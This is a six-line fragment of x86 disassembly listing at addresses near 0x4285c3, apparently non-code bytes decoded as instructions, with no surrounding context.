  4285c3:	in     al,0x22
  4285c5:	sub    eax,0xd2b29d6e
  4285ca:	jo     0x4285e3
  4285cc:	sbb    DWORD PTR [ecx+0x2f],eax
  4285cf:	jp     0x42861f
  4285d1:	add    eax,0x11d008e5
	...
